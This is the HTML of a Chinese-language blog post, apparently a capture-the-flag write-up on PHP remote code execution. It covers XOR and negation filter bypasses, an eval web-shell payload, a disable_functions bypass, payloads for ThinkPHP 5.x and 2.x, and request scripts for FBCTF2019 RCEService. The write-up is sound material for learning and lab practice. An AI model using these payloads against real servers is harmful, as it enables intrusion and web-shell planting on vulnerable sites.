@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="yanm1ng&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      初识RCE | Hexo
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+  
+    
+<script src="/js/local-search.js"></script>
+
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>Hexo</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/series/" class="item-link">Series</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+      
+        <li class="menu-item menu-item-search right-list">
+    <a role="button" class="popup-trigger">
+        <i class="fa fa-search fa-fw"></i>
+    </a>
+</li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/series/" class="menu-link">Series</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+    
+      <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+            <span class="search-icon">
+                <i class="fa fa-search"></i>
+            </span>
+            <div class="search-input-container">
+                <input autocomplete="off" autocapitalize="off"
+                    placeholder="Please enter your keyword(s) to search." spellcheck="false"
+                    type="search" class="search-input">
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa fa-times-circle"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+    
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>初识RCE</h2>
+  <p class="post-date">2022-04-12</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p>最近做题遇到很多与RCE有关的题目，整理其中一二写一篇关于RCE内容的博客。</p>
+<span id="more"></span>
+<h3 id="作用及原理">作用及原理</h3>
+<p>参考文章： <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771/article/details/118893434">RCE(远程代码执行漏洞)原理及漏洞利用</a></p>
+<p>RCE分为远程命令执行ping和远程代码执行evel。<br>
+漏洞出现的原因：没有在输入口做输入处理。<br>
+我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</p>
+<h4 id="系统命令执行函数">系统命令执行函数</h4>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jiang_bing/article/details/7044185">PHP 执行系统命令</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+<h4 id="windows系统命令拼接方式">windows系统命令拼接方式</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“|”:管道符，前面命令标准输出，后面命令的标准输入。例如：help |more</span><br><span class="line">“&amp;” commandA &amp; commandB 先运行命令A，然后运行命令B</span><br><span class="line">“||” commandA || commandB 运行命令A，如果失败则运行命令B</span><br><span class="line">“&amp;&amp;” commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</span><br></pre></td></tr></table></figure>
+<h3 id="异或绕过">异或绕过</h3>
+<p>在PHP中两个字符串异或之后，得到的还是一个字符串。如果正则过滤了一些字符串，那就可以使用两个不在正则匹配范围内的字符串进行异或得到我们想要的字符串。</p>
+<p>例如：我们异或 ‘?’ 和 ‘~’ 之后得到的是 ‘A’</p>
+<p>原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">字符：?         ASCII码：63           二进制：  00‭11 1111‬</span><br><span class="line">字符：~         ASCII码：126          二进制：  0111 1110‬</span><br><span class="line">异或规则：</span><br><span class="line">1   XOR   0   =   1</span><br><span class="line">0   XOR   1   =   1</span><br><span class="line">0   XOR   0   =   0</span><br><span class="line">1   XOR   1   =   0</span><br><span class="line">上述两个字符异或得到 二进制：  0100 0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br><span class="line"></span><br><span class="line">几个位运算符：</span><br><span class="line">可以把1理解为真，0理解为假；那么就可以把“&amp;”理解为“与”，“|”理解为“或”；**而对于“^”则是相同为就0**，不同就为1。“~”为取反操作。</span><br></pre></td></tr></table></figure>
+<h3 id="URL编码取反绕过">URL编码取反绕过</h3>
+<p>注意： 该方法只适用于PHP7。</p>
+<p>原理：对想要传入的参数，先进行URL编码再取反。</p>
+<p>这里列举一个题目说明——<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME">[极客大挑战 2019]RCE ME</a>，源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">            $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure>
+<p>代码的意思大概是以GET的方式执行$code变量，要求其长度不能超过40并且不能出现大小写字母和数字，否则将退出当前脚本。联想到使用异或运算或取反运算的方法，构造一句话木马。</p>
+<p>先试试<code>phpinfo();</code>，取反如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~&#x27;phpinfo&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">?code=(~%8F%97%8F%96%91%99%90)(); // ()和;没有过滤</span><br></pre></td></tr></table></figure>
+<p>成功会回显出phpinfo()的页面。</p>
+<p><img src="/2022/04/12/%E5%88%9D%E8%AF%86RCE/0.png" alt></p>
+<p>接下来我们需要认识一个新函数，<strong>assert函数</strong>，assert这个函数在php语言中是用来判断一个表达式是否成立。</p>
+<p>利用取反绕过构造一句话木马：<code>assert(eval($_POST[admin]));</code>，因为如果只是构造<code>eval($_POST[admin]);</code>不能成功上传，而assert在默认值下即使程序错误也是会继续执行的，与<code>@</code>类似（@符号的意思是不报错，即使执行错误，也不报错）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;assert&#x27;;</span><br><span class="line">echo urlencode(~$a);</span><br><span class="line">echo &quot;&lt;br /&gt;&quot;;//标识前后的作用</span><br><span class="line"></span><br><span class="line">$b =&#x27;(eval($_POST[admin]))&#x27;;</span><br><span class="line">echo urlencode(~$b);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9B%92%96%91%A2%D6%D6); //;要补上</span><br></pre></td></tr></table></figure>
+<h4 id="解法一">解法一</h4>
+<p>这时候就可以用蚁剑直接连接了，在根目录看到<code>flag</code>和<code>readflag</code>，flag是无内容的，readflag会有一个s权限 ，就是不能让你直接cat或者执行，需要绕过phpinfo()里的disable_functions。</p>
+<p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE。</p>
+<p>绕过phpinfo()里的disable_functions，将下载的<code>bypass_disablefunc_x64.so</code>和<code>bypass_disablefunc.php</code>上传到/var/tmp目录有上传权限，<strong>原因在于linux下有两个临时性目录—/tmp和/var/tmp</strong>。</p>
+<p><strong>最终payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</span><br><span class="line"></span><br><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125; == $&#123;_GET&#125;</span><br><span class="line">include 表达式包含并运行指定文件。</span><br></pre></td></tr></table></figure>
+<h4 id="解法二">解法二</h4>
+<p>还有一种方法更为简单粗暴，利用蚁剑的插件绕过。</p>
+<p><img src="/2022/04/12/%E5%88%9D%E8%AF%86RCE/php7.png" alt></p>
+<p>选择<code>php_GC_UAF</code>。</p>
+<p><img src="/2022/04/12/%E5%88%9D%E8%AF%86RCE/re.png" alt></p>
+<h3 id="ThinkPHP-5-x-的-RCE-漏洞代码分析">ThinkPHP 5.x 的 RCE 漏洞代码分析</h3>
+<p>题目地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BThinkPHP%5D5.0.23-Rce">戳</a></p>
+<p>参考文章：  <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/289860.html">ThinkPHP 5.x 的 RCE 漏洞代码分析</a> 、 <a target="_blank" rel="noopener" href="https://blog.csdn.net/ArrowQin/article/details/105913146">ThinkPHP v5.0.22 远程代码漏洞复现分析</a></p>
+<h4 id="控制器名未过滤导致rce"><strong>控制器名未过滤导致rce:</strong></h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?</span><br><span class="line">s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=-1 (-1查看全部信息)</span><br></pre></td></tr></table></figure>
+<p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数， <code>vars[0]</code>为传入的回调函数，<code>vars[1][]</code>为参数为回调函数的参数 。</p>
+<h4 id="核心类-Request-远程代码漏洞"><strong>核心类 Request 远程代码漏洞:</strong></h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?s=captcha  # url</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; test.php #POST传入参数</span><br><span class="line">or</span><br><span class="line">_method=__construct&amp;method=get&amp;filter[]=system&amp;get[]=echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; test.php</span><br><span class="line">最后登陆test.php</span><br></pre></td></tr></table></figure>
+<p>filter[]<code>为回调函数，</code>get[]<code>或</code>route[]<code>或</code>server[REQUEST_METHOD]<code>为回调函数的参数。执行回调函数的函数为</code>call_user_func()</p>
+<p>核心版需要开启debug模式</p>
+<h3 id="ThinkPHP-2-Rce">[ThinkPHP]2-Rce</h3>
+<p>题目地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BThinkPHP%5D2-Rce">戳</a></p>
+<p>参考文章： [<a target="_blank" rel="noopener" href="https://www.cnblogs.com/beidaxmf/p/15178500.html">ThinkPHP]2-Rce buuoj - Thr00k1e - 博客园</a></p>
+<p>POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">解法一：</span><br><span class="line">?s=/index/index/name/$&#123;@eval($_GET[1])&#125;&amp;1=phpinfo();</span><br><span class="line">system(&quot;ls&quot;);</span><br><span class="line">解法二：</span><br><span class="line">?s=/index/index/name/$&#123;@eval($_POST[1])&#125;</span><br><span class="line">post下：1=phpinfo();</span><br><span class="line">用数字型一句话密码是因为字符串型要用引号，而目标有魔术引号转义</span><br></pre></td></tr></table></figure>
+<h3 id="FBCTF2019-RCEService">[FBCTF2019]RCEService</h3>
+<p>考点：</p>
+<ul>
+<li>
+<p>正则表达式</p>
+</li>
+<li>
+<p>%a绕过</p>
+</li>
+<li>
+<p>PHP利用PCRE回溯次数限制绕过</p>
+</li>
+</ul>
+<p>首先启动靶机是一个以[json]( <a target="_blank" rel="noopener" href="https://www.runoob.com/json/json-tutorial.html">JSON 教程 | 菜鸟教程 (runoob.com)</a> )形式进行输入的rce接口，但是奇怪的是我们扫描目录后并没有发现源码，最后只能查看wp提取出源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&#x27;PATH=/home/rceservice/jail&#x27;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    $json = $_REQUEST[&#x27;cmd&#x27;];</span><br><span class="line"></span><br><span class="line">    if (!is_string($json)) &#123;</span><br><span class="line">        echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">    &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;, $json)) &#123;</span><br><span class="line">        echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;;</span><br><span class="line">        $cmd = json_decode($json, true)[&#x27;cmd&#x27;];</span><br><span class="line">        if ($cmd !== NULL) &#123;</span><br><span class="line">            system($cmd);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;Invalid input&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>由上至下简单分析一下源码，<code>putenv('PATH=/home/rceservice/jail');</code>设置了环境变量的PATH，导致不能使用相对路径，只能使用绝对路径；可以看出<code>preg_match</code>过滤了很多函数和命令，隐藏着对其回溯绕过的考点；<code>$cmd = json_decode($json, true)['cmd'];</code>加ture表示强制将json_decode转换$json为php关联数组，并将结果存到$cmd变量中，<code>['cmd']</code>表示传入的$cmd要有cmd作为键值。</p>
+<p>json_encode()和json_decode()是编译和反编译过程，注意json只接受utf-8编码的字符，所以json_encode()的参数必须是utf-8编码，否则会得到空字符或者null。</p>
+<h4 id="解法一：-0a绕过">解法一：%0a绕过</h4>
+<p>参考文章： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/Qiuzhiyu/p/12687756.html">%0a绕过XSS防御-poc - 求知鱼 - 博客园 (cnblogs.com)</a></p>
+<p>%0a表示换行符，认真阅读上面的文章后，我们知道 “m表示multi-line、s表示single-line”，有源码中开始出现的<code>^</code>和结尾出现的<code>$</code>，只有在修饰符为m的时候才指定为是开头和结尾，而在修饰符为s下<code>.</code>只能匹配除换行符外的任意字符，意味着我们可以用%0a采用多行绕过正则表达式。</p>
+<p>结合源码提示的路径和cmd键值，利用ls命令查看目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0a&quot;cmd&quot;:&quot;ls /home/rceservice&quot;%0a&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/12/%E5%88%9D%E8%AF%86RCE/ls.png" alt></p>
+<p>发现在该目录下有两个文件夹，flag和jail，很明显，flag就是我们要的。</p>
+<p>因为cat命令不能使用，已知 <strong>Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用；/sbin,/usr/sbin,默认root用户使用</strong>，而cat又在bin目录下，所以我们可以借用bin目录使用cat命令读取flag的内容。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0a&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure>
+<p>其他类似的利用%0a绕过preg_match的EXP都可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;%0a%0a</span><br><span class="line">?cmd=%0a&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/12/%E5%88%9D%E8%AF%86RCE/cat-1649576360357.png" alt></p>
+<h4 id="解法二：回溯">解法二：回溯</h4>
+<p>参考文章： <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+<p>参考文章将PCRE回溯次数限制绕过讲解得很清楚，直接附上脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&#x27; + &quot;a&quot;*(1000000) + &#x27;&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">res = requests.post(&quot;http://be940679-bb09-40a2-bc67-bebd5b39a911.node4.buuoj.cn:81/&quot;, data=&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&#x27;http://be940679-bb09-40a2-bc67-bebd5b39a911.node4.buuoj.cn:81/&#x27;</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;cmd&#x27;:&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&#x27;+&#x27;a&#x27;*1000000+&#x27;&quot;&#125;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,data=data).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>
+<p>两个的意思是一样的。</p>
+</section>
+    <!-- Tags START -->
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2022/03/31/pop%E9%93%BE/">
+        <span class="nav-arrow">← </span>
+        
+          pop链
+        
+      </a>
+    
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Utterances START -->
+      <div id="utterances"></div>
+      <script src="https://utteranc.es/client.js"
+        repo=""
+        issue-term="pathname"
+        theme="github-light"
+        crossorigin="anonymous"
+        async></script>    
+      <!-- Utterances END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BD%9C%E7%94%A8%E5%8F%8A%E5%8E%9F%E7%90%86"><span class="toc-nav-text">作用及原理</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-nav-text">系统命令执行函数</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#windows%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E6%96%B9%E5%BC%8F"><span class="toc-nav-text">windows系统命令拼接方式</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-nav-text">异或绕过</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#URL%E7%BC%96%E7%A0%81%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-nav-text">URL编码取反绕过</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-nav-text">解法一</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-nav-text">解法二</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ThinkPHP-5-x-%E7%9A%84-RCE-%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-nav-text">ThinkPHP 5.x 的 RCE 漏洞代码分析</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%8E%A7%E5%88%B6%E5%99%A8%E5%90%8D%E6%9C%AA%E8%BF%87%E6%BB%A4%E5%AF%BC%E8%87%B4rce"><span class="toc-nav-text">控制器名未过滤导致rce:</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-nav-text">核心类 Request 远程代码漏洞:</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ThinkPHP-2-Rce"><span class="toc-nav-text">[ThinkPHP]2-Rce</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#FBCTF2019-RCEService"><span class="toc-nav-text">[FBCTF2019]RCEService</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A-0a%E7%BB%95%E8%BF%87"><span class="toc-nav-text">解法一：%0a绕过</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" 